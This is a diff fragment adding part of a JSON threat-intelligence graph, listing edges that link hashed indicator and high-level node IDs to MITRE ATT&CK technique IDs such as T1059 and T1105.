+      "edge_id": "EDGE_74a2756eec86",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8790d80d1ece",
+      "node_u": "HL_0607bb9bb168",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_95c6fdf6531e",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_98b31a668151",
+      "node_u": "IOC_b57517de96ac",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9f1fec8e3945",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b2e3ca95dd62",
+      "node_u": "IOC_32b8d50c84f2",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_baa544f5310a",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_bea7e07df8f9",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_bf6b80edeccf",
+      "node_u": "HL_973c7ab7d44a",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c4afabd72079",
+      "node_u": "HL_0607bb9bb168",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ced084c84501",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d08f0f8e60b7",
+      "node_u": "HL_25ce2fdf283d",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ec94a16e0ef2",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f67d447518ca",
+      "node_u": "IOC_b57517de96ac",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_fedc2391e361",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ff6275ff963c",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0097d63541aa",
+      "node_u": "HL_6a0a95cd84d0",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_04ef99d90e9a",
+      "node_u": "IOC_cf8cdf485a85",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_07ed8643100d",
+      "node_u": "HL_973c7ab7d44a",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0abbb7368fde",
+      "node_u": "IOC_c7d7e885ec36",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0f781793f078",
+      "node_u": "IOC_4d91df6aefa1",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_105002f3e531",
+      "node_u": "IOC_4d91df6aefa1",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1330cf3c1d72",
+      "node_u": "IOC_11c69003e100",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1612a7a15b1d",
+      "node_u": "IOC_ae839dc30bb8",
+      "node_v": "TTP_T1569",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1a3ca7c48329",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bcf824222e5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bd523346af0",
+      "node_u": "IOC_1120f7426016",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_25afff398873",
+      "node_u": "IOC_04c1b2d0ccbf",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2bc527a5e896",
+      "node_u": "IOC_1e1b68e55755",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3575e0f1a1a2",
+      "node_u": "IOC_cd18b75537f5",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3a2f84373dd1",
+      "node_u": "IOC_c7e40e739a3b",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3ab01422dab0",
+      "node_u": "IOC_4f278b2e1cff",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3f5468d8ac7c",
+      "node_u": "IOC_2eabd5a10bef",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_40422d3334f9",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_413a10566f8a",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1102",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_48412b2bbc22",
+      "node_u": "HL_548f85d138f6",
+      "node_v": "TTP_T1102",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4c19d9b1bb52",
+      "node_u": "IOC_17f398714025",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4f7ab8ae5ceb",
+      "node_u": "HL_eb8915b8d64e",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6188e7c53930",
+      "node_u": "IOC_e2c1dc2bbfa0",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6b9e41313542",
+      "node_u": "IOC_c7e40e739a3b",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_744a5eba4fe2",
+      "node_u": "IOC_5fc841d9a55f",
+      "node_v": "TTP_T1036",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7adb15690831",
+      "node_u": "IOC_1e1b68e55755",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_82df7e2b6e6f",
+      "node_u": "IOC_488d49251394",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8ec1448c1e16",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_956a657ba8dc",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9b612a613039",
+      "node_u": "IOC_11c69003e100",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a63c539c46dd",
+      "node_u": "IOC_4f278b2e1cff",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a7fbe2bdf092",
+      "node_u": "IOC_5456579a7fc2",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b501fc3fdfbb",
+      "node_u": "IOC_9d757866d1e5",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b56c1dd0af73",
+      "node_u": "IOC_5fc841d9a55f",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b6ff033bc844",
+      "node_u": "IOC_02788cbf0e0a",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ba0ac9566e93",
+      "node_u": "IOC_eceea5a00ad1",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bdfed18f9ed1",
+      "node_u": "IOC_d7424b1e1436",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c0ffb155a3e0",
+      "node_u": "IOC_cf8cdf485a85",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c194b4a41891",
+      "node_u": "HL_eb8915b8d64e",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c5048fe8088d",
+      "node_u": "IOC_452e90101f57",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ccb69d26b808",
+      "node_u": "IOC_e2c1dc2bbfa0",
+      "node_v": "TTP_T1140",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0181937f7e8",
+      "node_u": "IOC_5456579a7fc2",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e02c33d1db18",
+      "node_u": "IOC_ae839dc30bb8",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e63de98c7edf",
+      "node_u": "IOC_04c1b2d0ccbf",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ece64d5bd66a",
+      "node_u": "IOC_dffe5915dd92",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f44ec0ba4995",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f8ce0dd09a34",
+      "node_u": "IOC_a556d829e448",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f9586280275b",
+      "node_u": "IOC_9d757866d1e5",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_fa6d1c0da8b5",
+      "node_u": "IOC_9cfa8346a4be",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0105c58b4da7",
+      "node_u": "IOC_2d1080618859",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_01328e6cc50b",
+      "node_u": "IOC_b812d40d06ae",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_08a3b1a1d90f",
+      "node_u": "HL_e4c3acfd2691",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0f3483ccd76d",
+      "node_u": "IOC_a09549415952",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_11f3d1f34667",
+      "node_u": "IOC_ff215c58bd14",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_12ca7069a8af",
+      "node_u": "IOC_ec7f69171716",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1970343aa1d5",
+      "node_u": "IOC_2d1080618859",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_1d6053e2c9b1",
+      "node_u": "IOC_ec7f69171716",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2f0ff980242c",
+      "node_u": "IOC_ac0bd4b7d08c",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_34369c0b9516",
+      "node_u": "IOC_822b40d45382",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3ae9e551cee7",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3c31a087258f",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3e4a0e948199",
+      "node_u": "IOC_822b40d45382",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3f75d833e3f9",
+      "node_u": "IOC_4edb0b7ee0af",
+      "node_v": "TTP_T1041",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4c2c94b888c6",
+      "node_u": "IOC_3d20f66ab349",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_5037c22a73cc",
+      "node_u": "HL_7dc7fe42ab43",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5297c8e43949",
+      "node_u": "IOC_3d20f66ab349",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6a4b32dc8cc2",
+      "node_u": "IOC_352516063d96",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6bd66c99b194",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1041",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6f40216b6f8e",
+      "node_u": "IOC_a0ce1b230a39",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_76ac9577b6a7",
+      "node_u": "HL_4c12b0f7e5aa",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8beccf0ea34c",
+      "node_u": "IOC_813450f89434",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9003a87fdc48",
+      "node_u": "IOC_9d64521e00e2",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_91131338c030",
+      "node_u": "IOC_464794d7ed57",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_94120b598628",
+      "node_u": "IOC_62b9d47e14a0",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_981f36c7a931",
+      "node_u": "HL_8d8305c76d1a",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a5a4ac149217",
+      "node_u": "HL_4c12b0f7e5aa",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a8b7c65c770b",
+      "node_u": "IOC_ec7f69171716",
+      "node_v": "TTP_T1053",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ad3e117c0c94",
+      "node_u": "HL_7dc7fe42ab43",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_aefa2a1585b2",
+      "node_u": "IOC_464794d7ed57",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bc0605d852eb",
+      "node_u": "IOC_4ea48062c5d3",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_bc72188e89a6",
+      "node_u": "IOC_904d45b8a9d2",
+      "node_v": "TTP_T1055",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c4f13684bfcc",
+      "node_u": "IOC_15ad1397b417",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c68d8c983667",
+      "node_u": "IOC_ff215c58bd14",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c6c6a8338d9d",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1053",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cb5ba7a3f9fe",
+      "node_u": "IOC_9d64521e00e2",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cbddbdae522a",
+      "node_u": "IOC_15ad1397b417",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d3cd7a3fff92",
+      "node_u": "IOC_65707b8902d5",
+      "node_v": "TTP_T1566",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d813c89110c0",
+      "node_u": "HL_8d8305c76d1a",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ddf01b7b3a59",
+      "node_u": "IOC_c424e4e465f3",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e224dd9c03d9",
+      "node_u": "IOC_6d46913a25f2",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e4c842e14f69",
+      "node_u": "IOC_41dfdc5c68b1",
+      "node_v": "TTP_T1562",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e508440482f0",
+      "node_u": "HL_e4c3acfd2691",
+      "node_v": "TTP_T1518",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ec42f57d191e",
+      "node_u": "IOC_41dfdc5c68b1",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_edd799a4ae7b",
+      "node_u": "IOC_ac0bd4b7d08c",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_efdf97ac55ca",
+      "node_u": "IOC_a09549415952",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    }
+  ]
+}
